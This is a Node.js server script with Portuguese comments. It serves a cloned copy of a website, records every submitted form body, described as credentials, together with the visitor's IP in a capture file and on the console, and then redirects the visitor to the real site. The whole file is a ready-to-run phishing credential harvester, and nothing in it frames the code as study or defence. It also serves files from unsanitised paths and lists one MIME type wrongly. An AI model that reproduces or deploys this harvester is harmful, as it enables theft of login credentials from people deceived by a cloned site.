const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const SITE_DIR = process.env.SITE_DIR || path.join(__dirname, '..', 'site_clone');
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, '..', 'capturas.txt');
const REDIRECT_URL = process.env.REDIRECT_URL || '';

const MIME = {
    '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.gif': 'image/gif', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
    '.woff': 'function/woff', '.woff2': 'font/woff2', '.ttf': 'font/ttf',
    '.json': 'application/json', '.xml': 'application/xml', '.mp4': 'video/mp4',
};

// Capturar credenciais e mostrar no console do Termux
function captureAndLog(body, clientIP) {
    const ts = new Date().toISOString().replace('T', ' ').split('.')[0];
    const params = new URLSearchParams(body);
    const data = {};
    for (let [k, v] of params.entries()) {
        data[k] = v;
    }
    const entry = `[${ts}] IP: ${clientIP}\n  ${JSON.stringify(data, null, 2)}`;
    fs.appendFileSync(LOG_FILE, entry + '\n');
    console.log(`\n\n🚨 CAPTURADO:\n${entry}\n`);
}

const server = http.createServer((req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'desconhecido';

    // POST = credenciais enviadas
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            if (body) captureAndLog(body, clientIP);
            res.writeHead(302, { 'Location': REDIRECT_URL });
            res.end();
        });
        return;
    }

    // GET = servir arquivos do site clonado
    let urlPath = req.url.split('?')[0];
    if (urlPath === '/') urlPath = '/index.html';

    const filePath = path.join(SITE_DIR, urlPath);
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, data) => {
        if (err) {
            // Se não encontrou o arquivo, servir index.html (SPA fallback)
            const indexPath = path.join(SITE_DIR, 'index.html');
            fs.readFile(indexPath, (err2, idxData) => {
                if (err2) {
                    res.writeHead(404, { 'Content-Type': 'text/plain' });
                    res.end('404 - Site não encontrado');
                } else {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(idxData);
                }
            });
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(data);
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando em http://0.0.0.0:${PORT}`);
    console.log(`Credenciais serão salvas em: ${LOG_FILE}`);
});
